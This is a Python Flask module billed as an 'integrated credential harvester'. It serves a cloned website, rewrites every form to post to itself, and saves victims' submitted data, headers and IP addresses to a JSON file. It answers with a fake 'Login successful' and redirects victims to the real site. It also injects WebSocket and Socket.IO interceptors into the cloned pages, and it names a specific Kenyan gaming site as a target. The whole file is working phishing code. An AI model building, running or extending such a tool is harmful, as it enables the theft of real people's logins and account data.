"""Integrated credential harvester with site serving"""
import logging
from flask import Flask, request, redirect, send_from_directory, Response
from datetime import datetime
from pathlib import Path
import json
import threading
from bs4 import BeautifulSoup
from .websocket_interceptor import WebSocketInterceptor, inject_websocket_interceptor
from .socketio_interceptor import SocketIOInterceptor, inject_socketio_interceptor

logger = logging.getLogger(__name__)

class IntegratedHarvester:
    """Serves cloned site and captures credentials"""
    
    def __init__(self, site_dir: str, port: int = 8080, output_file: str = "harvested_creds.json", 
                 capture_websocket: bool = False, ws_url: str = None):
        self.site_dir = Path(site_dir)
        self.port = port
        self.output_file = Path(output_file)
        self.output_file.parent.mkdir(parents=True, exist_ok=True)
        self.captured = []
        self.app = Flask(__name__)
        self.server_thread = None
        self.redirect_url = None
        self.capture_websocket = capture_websocket
        self.ws_url = ws_url
        self.ws_interceptor = None
        
        # Setup WebSocket interceptor if enabled
        if self.capture_websocket and self.ws_url:
            # Use Socket.IO interceptor for pakamia gameserver
            if 'gameserver.pakamia.ke' in self.ws_url or 'socket.io' in self.ws_url:
                self.socketio_interceptor = SocketIOInterceptor(
                    output_file=str(self.output_file.parent / "socketio_capture.json")
                )
                # Inject Socket.IO interceptor into HTML
                inject_socketio_interceptor(str(self.site_dir))
            else:
                self.ws_interceptor = WebSocketInterceptor(
                    output_file=str(self.output_file.parent / "websocket_capture.json")
                )
                # Inject WebSocket interceptor into HTML
                inject_websocket_interceptor(str(self.site_dir), self.ws_url)
                # Setup WebSocket proxy route
                self.ws_interceptor.setup_websocket_proxy(self.app, self.ws_url)
        
        # Modify forms on startup
        self._modify_all_forms()
        
        # Setup routes
        @self.app.route('/', methods=['GET'])
        def index():
            return self._serve_file('index.html')
        
        @self.app.route('/<path:path>', methods=['GET'])
        def serve_static(path):
            return self._serve_file(path)
        
        @self.app.route('/<path:path>', methods=['POST', 'PUT', 'PATCH'])
        def capture(path):
            return self._capture_credentials(path)
        
        @self.app.route('/submit', methods=['POST', 'PUT', 'PATCH'])
        def capture_submit():
            return self._capture_credentials('submit')
        
        @self.app.route('/api/<path:path>', methods=['POST', 'PUT', 'PATCH', 'GET'])
        def capture_api(path):
            if request.method in ['POST', 'PUT', 'PATCH']:
                return self._capture_credentials(f'api/{path}')
            return json.dumps({"success": True}), 200, {'Content-Type': 'application/json'}
        
        @self.app.route('/capture-socketio', methods=['POST'])
        def capture_socketio():
            """Capture Socket.IO messages from JavaScript"""
            try:
                data = request.get_json()
                if hasattr(self, 'socketio_interceptor'):
                    self.socketio_interceptor.log_message(
                        data.get('event', 'unknown'),
                        data.get('data', {}),
                        data.get('direction', 'unknown')
                    )
                return json.dumps({"success": True}), 200, {'Content-Type': 'application/json'}
            except Exception as e:
                logger.error(f"Socket.IO capture failed: {e}")
                return json.dumps({"success": False}), 500, {'Content-Type': 'application/json'}
        
        @self.app.route('/captured', methods=['GET'])
        def show_captured():
            return json.dumps(self.captured, indent=2)
    
    def _modify_all_forms(self):
        """Modify all HTML files to point forms to harvester"""
        html_files = list(self.site_dir.rglob("*.html"))
        modified = 0
        
        for html_file in html_files:
            try:
                with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                soup = BeautifulSoup(content, 'html.parser')
                forms = soup.find_all('form')
                
                if forms:
                    for form in forms:
                        # Keep relative path but ensure POST to same server
                        form['action'] = '/submit'
                        form['method'] = 'POST'
                    
                    with open(html_file, 'w', encoding='utf-8') as f:
                        f.write(str(soup))
                    
                    modified += 1
                    logger.info(f"Modified forms in {html_file.name}")
            except Exception as e:
                logger.error(f"Failed to modify {html_file}: {e}")
        
        logger.info(f"Modified {modified} HTML files")
    
    def _serve_file(self, path):
        """Serve files from cloned site directory"""
        try:
            if path == '' or path == '/':
                path = 'index.html'
            
            # Remove leading slash
            path = path.lstrip('/')
            
            file_path = self.site_dir / path
            
            # If not found, try without domain prefix
            if not file_path.exists():
                # Try finding in subdirectories
                for subdir in self.site_dir.iterdir():
                    if subdir.is_dir():
                        alt_path = subdir / path
                        if alt_path.exists():
                            file_path = alt_path
                            break
            
            if file_path.exists() and file_path.is_file():
                # Determine content type
                suffix = file_path.suffix.lower()
                content_types = {
                    '.html': 'text/html',
                    '.css': 'text/css',
                    '.js': 'application/javascript',
                    '.json': 'application/json',
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.svg': 'image/svg+xml',
                    '.ico': 'image/x-icon',
                    '.woff': 'font/woff',
                    '.woff2': 'font/woff2',
                    '.ttf': 'font/ttf',
                }
                
                content_type = content_types.get(suffix, 'application/octet-stream')
                
                with open(file_path, 'rb') as f:
                    return Response(f.read(), mimetype=content_type)
            else:
                logger.warning(f"File not found: {path} (tried {file_path})")
                return "File not found", 404
                
        except Exception as e:
            logger.error(f"Error serving {path}: {e}")
            return f"Error: {e}", 500
    
    def _capture_credentials(self, path):
        """Capture POST data"""
        try:
            # Get form data or JSON data
            if request.is_json:
                form_data = request.get_json()
            else:
                form_data = dict(request.form)
            
            data = {
                "timestamp": datetime.now().isoformat(),
                "path": path,
                "form_data": form_data,
                "headers": dict(request.headers),
                "ip": request.remote_addr,
                "method": request.method,
                "content_type": request.content_type
            }
            
            self.captured.append(data)
            
            # Save to file
            with open(self.output_file, 'w') as f:
                json.dump(self.captured, f, indent=2)
            
            logger.info(f"🎯 CAPTURED from {request.remote_addr}")
            logger.info(f"📊 Data: {form_data}")
            
            # Print to console
            print(f"\n{'='*60}")
            print(f"🎯 CREDENTIALS CAPTURED!")
            print(f"{'='*60}")
            print(f"Time: {data['timestamp']}")
            print(f"IP: {data['ip']}")
            print(f"Path: {path}")
            print(f"Method: {request.method}")
            print(f"Data: {json.dumps(form_data, indent=2)}")
            print(f"{'='*60}\n")
            
            # Return JSON response for AJAX requests
            if request.is_json or 'application/json' in request.headers.get('Accept', ''):
                return json.dumps({"success": True, "message": "Login successful"}), 200, {'Content-Type': 'application/json'}
            
            # Redirect to real site if configured
            if self.redirect_url:
                return redirect(self.redirect_url, code=302)
            else:
                return "Success", 200
                
        except Exception as e:
            logger.error(f"Capture failed: {e}")
            if request.is_json:
                return json.dumps({"success": False, "error": str(e)}), 500, {'Content-Type': 'application/json'}
            return "Error", 500
    
    def start(self, redirect_url: str = None, background: bool = True):
        """Start the integrated harvester"""
        self.redirect_url = redirect_url
        
        if background:
            self.server_thread = threading.Thread(
                target=lambda: self.app.run(host='0.0.0.0', port=self.port, debug=False),
                daemon=True
            )
            self.server_thread.start()
            logger.info(f"Integrated harvester started on port {self.port}")
        else:
            self.app.run(host='0.0.0.0', port=self.port, debug=False)
    
    def get_captured(self):
        """Get all captured credentials"""
        return self.captured


def start_integrated_harvester(site_dir: str, port: int = 8080, 
                               output_file: str = "harvested_creds.json",
                               redirect_url: str = None,
                               capture_websocket: bool = False,
                               ws_url: str = None) -> IntegratedHarvester:
    """Start integrated harvester that serves site and captures credentials
    
    Args:
        site_dir: Directory containing cloned site
        port: Port to listen on
        output_file: File to save captured credentials
        redirect_url: URL to redirect victims after capture
        capture_websocket: Enable WebSocket interception
        ws_url: WebSocket URL to proxy (e.g., wss://pakamia.ke/ws)
        
    Returns:
        IntegratedHarvester instance
    """
    harvester = IntegratedHarvester(site_dir, port, output_file, capture_websocket, ws_url)
    harvester.start(redirect_url=redirect_url, background=True)
    return harvester
